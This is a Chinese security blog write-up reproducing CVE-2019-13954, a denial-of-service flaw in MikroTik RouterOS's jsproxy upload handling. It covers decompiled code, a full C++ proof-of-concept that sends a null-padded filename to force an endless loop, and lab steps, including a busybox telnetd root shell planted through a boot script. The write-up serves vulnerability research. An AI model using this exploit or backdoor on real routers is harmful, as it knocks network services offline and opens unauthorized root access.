# MikroTik RouterOS-CVE-2019-13954漏洞复现

阅读量 **315781**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-03 15:30:18

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01255f5f78d673b819.jpg)

## 产品描述：

**MikroTik RouterOS** 是一种 **路由操作系统**
，并通过该软件将标准的PC电脑变成专业路由器，在软件的开发和应用上不断的更新和发展，软件经历了多次更新和改进，使其功能在不断增强和完善。特别在无线、认证、策略路由、带宽控制和防火墙过滤等功能上有着非常突出的功能，其极高的性价比，受到许多网络人士的青睐。RouterOS在具备现有路由系统的大部分功能，能针对网吧、企业、小型ISP接入商、社区等网络设备的接入，基于标准的
**x86构架** 的PC。一台586PC机就可以实现路由功能，提高硬件性能同样也能提高网络的访问速度和吞吐量。完全是一套低成本，高性能的路由器系统。

## 漏洞利用分析：

###  漏洞描述：

根据CVE-2019-13954的漏洞公告中得知，认证的用户可以通过发送一个特殊的POST请求，服务器在处理此请求时会陷入死循环，造成内存耗尽，导致系统的服务瘫痪重启

![](https://p1.ssl.qhimg.com/t015b57d9b0be67ff85.jpg)

###  漏洞原理：

CVE-2019-13954的漏洞利用地方跟CVE-2018-1157的类似，都是同一个地方死循环

下面是`6.40.5`，`x86`架构的漏洞文件反汇编代码：从中不难看出，有两个重要的函数决定循环是否能跳出while的死循环，sub_5E9F()和Headers::parseHeaderLine解析后的返回值为非零（即解析失败），因此此处可以利用的点就这两个函数

    
    
    int __cdecl JSProxyServlet::doUpload(int a1, int a2, Headers *a3, Headers *a4)
    {
        //    ...
      while ( 1 )
      {
        sub_5E9F(v32, &s1);
        if ( !s1 )
          break;
        string::string((string *)&v41, &s1);
        v14 = Headers::parseHeaderLine((Headers *)&v42, (const string *)&v41);
        string::freeptr((string *)&v41);
        if ( !v14 )    
        {
          string::string((string *)&v41, "");
          Response::sendError(a4, 400, (const string *)&v41);
          string::freeptr((string *)&v41);
    LABEL_56:
          tree_base::clear(v16, v15, &v42, map_node_destr<string,HeaderField>);
          goto LABEL_57;
        }
      }
      //...
    }
    

问题就出在sub_5E9F函数（读取post请求数据），在getline的时候，如果输入的字节数量大于

    
    
    char *__usercall sub_5E9F@<eax>(istream *a1@<eax>, char *a2@<edx>)
    {
      char *v2; // esi
      char *result; // eax
      unsigned int v4; // ecx
    
      v2 = a2;
      istream::getline(a1, a2, 256u, '\n');
      result = 0;
      v4 = strlen(v2) + 1;
      if ( v4 != 1 )
      {
        result = &v2[v4 - 2];
        if ( *result == 13 )
          *result = 0;
      }
      return result;
    }
    

下面是`6.42.11`，`x86`架构打了补丁的JSProxyServlet::doUpload，加了一个长度判断是不是0x100个字节

    
    
    int __cdecl JSProxyServlet::doUpload(int a1, int a2, Headers *a3, Headers *a4)
    {
    //...
      while ( 1 )
      {
        sub_51F7(v37, &s1);
        if ( !s1 )
          break;
        v14 = -1;
        v15 = &s1;
        do
        {
          if ( !v14 )
            break;
          v16 = *v15++ == 0;
          --v14;
        }
        while ( !v16 );
        if ( v14 != 0x100u )
        {
          v36 = 0;
          string::string((string *)&v46, &s1);
          v17 = Headers::parseHeaderLine((Headers *)&v47, (const string *)&v46);
          string::freeptr((string *)&v46);
          if ( v17 )
            continue;
        }
        string::string((string *)&v46, "");
        Response::sendError(a4, 400, (const string *)&v46);
        string::freeptr((string *)&v46);
    LABEL_60:
        tree_base::clear(v19, v18, &v47, map_node_destr<string,HeaderField>);
        goto LABEL_61;
      }
    //...
    }
    

相比`6.40.5`版本，6.42.11中sub_51F7的getline还是没有变

    
    
    char *__usercall sub_51F7@<eax>(istream *a1@<eax>, char *a2@<edx>)
    {
      char *v2; // esi
      char *result; // eax
      unsigned int v4; // ecx
    
      v2 = a2;
      istream::getline(a1, a2, 0x100u, '\n');
      result = 0;
      v4 = strlen(v2) + 1;
      if ( v4 != 1 )
      {
        result = &v2[v4 - 2];
        if ( *result == 13 )
          *result = 0;
      }
      return result;
    }
    

###  POC原理：

利用getline原理

虽然6.42.11的版本中JSProxyServlet::doUpload加入了长度的判断，并且getline是按照\n（getline是按行读取）结束符前取前0x100个字节，但是可以通过构造很多\00来影响整个字符串的长度，getline只会将\n前的0x100个字符读入缓冲区，再会消化掉\n转化为\00，总之getline()会根据参数对输入产生截断，不考虑字符数组的存储空间，先将输入转换为`"xxxx\0"`的格式

当是cin.getline(a, 5)时，输入abcdef，输出是abcd

![](https://p3.ssl.qhimg.com/t018dc91efd8b71d1c3.jpg)

当是cin.getline(a, 6)时，输入abcdef，输出是abcde

![](https://p2.ssl.qhimg.com/t01e406d44a30871599.jpg)

说明getline可能把空行\n转化为字符\0了，然后把\0算入所谓的长度5中了，不信，上汇编

测试代码：（长度改为了6）

    
    
    #include <iostream>
    #include <string>
    
    using namespace std;
    
    int main(void) {
            char a[5];
          cin.getline(a, 6);
          int b = 5;
          cout << "hello b = " << b << " a = " << a << endl;
            return 0;
    }
    

输入abcdefghimn

![](https://p2.ssl.qhimg.com/t018e0ef1515bbb3d28.jpg)

查看内存发现，输入d额是abcdefghimn，数组的空间被依次赋值为a,b,c,d,e，可见getline把空行转化为了\000，并且把\000也当作字符数组成员之一了

![](https://p2.ssl.qhimg.com/t01394f1be521e157dd.jpg)

输入abc\0\0\0\0\0\0的话内存是这样的，下面可见getline把多个\0当成\\\字符了！因此可以用这个技巧去改变数组长度！

![](https://p5.ssl.qhimg.com/t01876a874be35d2f05.jpg)

POC：

因为输入多个\0可以组合成\00字符，这样就不会被getline截断啦，因此post多发送几个\00就ok啦

    
    
    #include <cstdlib>
    #include <iostream>
    #include <boost/cstdint.hpp>
    #include <boost/program_options.hpp>
    
    #include "jsproxy_session.hpp"
    #include "winbox_message.hpp"
    
    namespace
    {
        const char s_version[] = "CVE-2019-13954 PoC 1.1.0";
    
        bool parseCommandLine(int p_argCount, const char* p_argArray[],
                              std::string& p_username, std::string& p_password,
                              std::string& p_ip, std::string& p_port)
        {
            boost::program_options::options_description description("options");
            description.add_options()
            ("help,h", "A list of command line options")
            ("version,v", "Display version information")
            ("username,u", boost::program_options::value<std::string>(), "The user to log in as")
            ("password", boost::program_options::value<std::string>(), "The password to log in with")
            ("port,p", boost::program_options::value<std::string>()->default_value("80"), "The HTTP port to connect to")
            ("ip,i", boost::program_options::value<std::string>(), "The IPv4 address to connect to");
    
            boost::program_options::variables_map argv_map;
            try
            {
                boost::program_options::store(
                    boost::program_options::parse_command_line(
                        p_argCount, p_argArray, description), argv_map);
            }
            catch (const std::exception& e)
            {
                std::cerr << e.what() << "\n" << std::endl;
                std::cerr << description << std::endl;
                return false;
            }
    
            boost::program_options::notify(argv_map);
            if (argv_map.empty() || argv_map.count("help"))
            {
                std::cerr << description << std::endl;
                return false;
            }
    
            if (argv_map.count("version"))
            {
                std::cerr << "Version: " << ::s_version << std::endl;
                return false;
            }
    
            if (argv_map.count("username") && argv_map.count("ip") &
                argv_map.count("port"))
            {
                p_username.assign(argv_map["username"].as<std::string>());
                p_ip.assign(argv_map["ip"].as<std::string>());
                p_port.assign(argv_map["port"].as<std::string>());
    
                if (argv_map.count("password"))
                {
                    p_password.assign(argv_map["password"].as<std::string>());
                }
                else
                {
                    p_password.assign("");
                }
                return true;
            }
            else
            {
                std::cerr << description << std::endl;
            }
    
            return false;
        }
    }
    
    int main(int p_argc, const char** p_argv)
    {
        std::string username;
        std::string password;
        std::string ip;
        std::string port;
        if (!parseCommandLine(p_argc, p_argv, username, password, ip, port))
        {
            return EXIT_FAILURE;
        }
    
        JSProxySession jsSession(ip, port);
        if (!jsSession.connect())
        {
            std::cerr << "Failed to connect to the remote host" << std::endl;
            return EXIT_FAILURE;
        }
    
        // generate the session key but don't log in
        if (!jsSession.negotiateEncryption(username, password, false))
        {
            std::cerr << "Encryption negotiation failed." << std::endl;
            return EXIT_FAILURE;
        }
    
        std::string filename;
        for (int i = 0; i < 0x50; i++)
        {
          filename.push_back('A');
        }
    
        for (int i = 0; i < 0x100; i++)
        {
          filename.push_back('\x00');
        }
    
        if (jsSession.uploadFile(filename, "lol."))
        {
            std::cout << "success!" << std::endl;
        }
    
        return EXIT_SUCCESS;
    }
    

###  漏洞验证

gdb调试验证构造的特殊post可以使系统程序www陷入死循环

在调试验证的过程中注意Linux默认开启了ASLR保护机制，为了好找地址，关掉ASLR

`sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"`

通过后门busybox登陆routeros，查看www的进程pid后，开启gdbserver附加www

![](https://p3.ssl.qhimg.com/t01d86c3e729a6b15cc.jpg)

开启gdb，准备调试，设置架构为i386，目标主机为192.168.0.113，端口为1234

`set architecture i386`

`target remote 192.168.0.113:1234`

![](https://p5.ssl.qhimg.com/t01c92873314b6cb2f4.jpg)

同时本地运行POC，`info proc mappings`查看当前已经加载的模块，但是没发现有关jsproxy的模块

![](https://p0.ssl.qhimg.com/t01b8d1edf7f1139178.jpg)

对www模块进行断点，然后s几下便发现jsproxy.p出来了

![](https://p3.ssl.qhimg.com/t0171c810c9416e991c.jpg)

在ida中找到要断点的函数的偏移地址，从doUpload函数断点，偏移量为8D08

![](https://p4.ssl.qhimg.com/t01935f1b857bd5f0e3.jpg)

将mappings中jsproxy的基地址加上偏移地址就ok了，对其断点

![](https://p2.ssl.qhimg.com/t01a4d56a1e67255a82.jpg)

![](https://p0.ssl.qhimg.com/t0114455b7ee697b22e.jpg)

接下里我们可以通过对sub_51F7下断点，然后c几次，再取消断点运行看是否会使系统重启

![](https://p4.ssl.qhimg.com/t01c688be038633deb3.jpg)

Sub_51F7的地址为0x77540000+0x51F7，c几次会一直执行

![](https://p2.ssl.qhimg.com/t01bc733cc060694ef6.jpg)

将断点删除后，发现系统重启了，成功验证该漏洞！

![](https://p0.ssl.qhimg.com/t01bc3eb9d08548f944.jpg)

![](https://p4.ssl.qhimg.com/t015062faaac0b688d5.jpg)

## 漏洞环境搭建过程

###  RouterOS环境搭建

因为CVE-2019-13954跟CVE-2018-1157原理类似，可以顺便也了解下，可以选择同时下载两个版本，都验证一下

CVE-2018-1157可在系统版本6.40.5验证

CVE-2019-13954可在系统版本6.42.11验证

MikroTik RouterOS镜像下载地址：<https://mikrotik.com/download>

虚拟机安装镜像，按a，选择所有，然后i安装，后续都默认y就行

![](https://p5.ssl.qhimg.com/t019f6ada0072349f9c.jpg)

用户名是admin，密码为空，下图说明成功安装

![](https://p5.ssl.qhimg.com/t01a06be6e5f4eb8f0e.jpg)

把虚拟机改成桥接模式

![](https://p1.ssl.qhimg.com/t01d134f1d6b563ec85.jpg)

虚拟机获取ip

`ip dhcp-client add interface=ether disabled=no`

查看虚拟机获取的ip

`ip dhcp-client print detail`

![](https://p0.ssl.qhimg.com/t01690dd7d07c7b3f6a.jpg)

测试是否能ping通，测试ok

![](https://p1.ssl.qhimg.com/t012f677465873f447f.jpg)

我们需要下载busybox（用于开root后门）、gdbserver.i686（远程调试）

busybox：`wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox`

**busybox使静态编译的，不依赖于系统的动态链接库，从而不受ld.so.preload的劫持，能够正常操作文件。系统在执行程序的时候，会通过环境变量LD_PRELOAD和配置文件/etc/ld.so.preload进行预加载从而调用动态链接库，如果这两者被修改的话，那么系统程序在执行的时候，就会调用这两者被修改的内容。**

除了busybox，我们还可以通过[https://github.com/tenable/routeros下的**cleaner_wrasse**利用漏洞开启后门](https://github.com/tenable/routeros%E4%B8%8B%E7%9A%84**cleaner_wrasse**%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%90%AF%E5%90%8E%E9%97%A8)

gdbserver.i686下载地址：<https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.i686>

下载后，我们还需要一个LiveDVD的linux系统镜像，用来挂载RouterOS的文件系统，并上传和改写文件

CentOS-6.10-x86-64-LiveDVD下载地址：<https://vault.centos.org/6.10/isos/x86_64/>

![](https://p1.ssl.qhimg.com/t012d05f0167b7dde43.jpg)

在虚拟机设置CD/DVD驱动器为上面下载的CentOS的镜像

![](https://p0.ssl.qhimg.com/t0140d954d3217659a7.jpg)

在启动磁盘这选择CD/DVD，并重新启动

![](https://p3.ssl.qhimg.com/t01c22dfbef6e1d618d.jpg)

如果启动非常慢，可以在虚拟机设置里，把CPU的核心和内存分配多点，这样运行快些

![](https://p5.ssl.qhimg.com/t01e30b5723ff26aa78.jpg)

如果可以看到有rw这个文件夹，说明挂载成功了

![](https://p0.ssl.qhimg.com/t012da868a801699a77.jpg)

进入rw文件夹，打开终端，进入root权限，如果disk是绿色的说明没有损坏，我有一次是红色的，如果也出现跟我类似的情况就重装一次RouterOS就行

![](https://p3.ssl.qhimg.com/t01c6423bfa37f16b70.jpg)

进入disk文件夹，因为我已经下过了，并且把busybox-i686和gdbserver.i686都放到自己的服务器上了，所以我这里就直接用scp从服务器上下载下来

![](https://p4.ssl.qhimg.com/t01367c14e18d10c7c9.jpg)

别忘了给权限

![](https://p3.ssl.qhimg.com/t01f2553780f09fba37.jpg)

最后我们还需要在/rw目录下编写一个DEFCONF脚本，用来使RouterOS开机运行后门，RouterOS每次开机都会运行DEFCONF这个文件，但是重启之后会没了，不想麻烦的，可以开个快照

`ok; /rw/disk/busybox-i686 telnetd -l /bin/bash -p 1270;`

![](https://p0.ssl.qhimg.com/t0183f84ab6f62fd833.jpg)

在虚拟机里从硬盘重启RouterOS，重启后在要输入账号的时候出现下面这样，说明busybox的后门成功开启了

![](https://p0.ssl.qhimg.com/t01f1546d1aeae56c18.jpg)

此时，我们可以不通过用户名和密码就在ubuntu中直接telnet远程登陆RouterOS了

`telnet ip port`

![](https://p5.ssl.qhimg.com/t01bebb5e5a94333012.jpg)

###  漏洞文件获取

在通过后门登陆后，查看www和jsproxy.p所在的位置

![](https://p0.ssl.qhimg.com/t01c94008b4b9eb02c4.jpg)

![](https://p1.ssl.qhimg.com/t013315db1cdc5e6e1c.jpg)

这里可以通过工具[Chimay-Red](https://github.com/BigNerd95/Chimay-Red)从官网上提取6.40.5和6.42.11版本的www、jsproxy.p

`./tools/getROSbin.py 6.40.5 x86 /nova/bin/www www_binary`

`./tools/getROSbin.py 6.42.11 x86 /nova/bin/www www_binary_2`

![](https://p3.ssl.qhimg.com/t011f7a1f68c35be6c4.jpg)

![](https://p3.ssl.qhimg.com/t01dce32a2a7bc96768.jpg)

###  编译生成POC

依赖环境:

  * Boost 1.66 or higher
  * cmake （我ubuntu有装过，就不再装了）

安装Boost：

Ubuntu：

`sudo apt-get install libboost-dev`

测试代码：

    
    
    #include <iostream>
    #include<boost/version.hpp>
    #include<boost/config.hpp>
    
    using namespace std;
    
    int main() {
        cout << BOOST_VERSION << endl;
        cout << BOOST_LIB_VERSION << endl;
        cout << BOOST_PLATFORM << endl;
        cout << BOOST_COMPILER << endl;
        cout << BOOST_STDLIB << endl;
      return 0;
    }
    

如果能运行并且出现下面的信息，说明成功

![](https://p4.ssl.qhimg.com/t011279d2d5170c800b.jpg)

POC编译的环境以及其他要用到的脚本文件

`git clone https://github.com/tenable/routeros.git`

![](https://p3.ssl.qhimg.com/t01b1e77b77f2ec970c.jpg)

编译生成cve_2019_13954的poc

`cd cve_2019_13954`

`mkdir build`

`cd build`

`cmake ..`

`make`

![](https://p4.ssl.qhimg.com/t01942fb153f2995cdc.jpg)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Re1own** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254635](/post/id/254635)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [IoT](/tag/IoT)

 **+1** __4赞

 __收藏

![](https://p5.ssl.qhimg.com/t01672d34da5048e614.png) Re1own

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

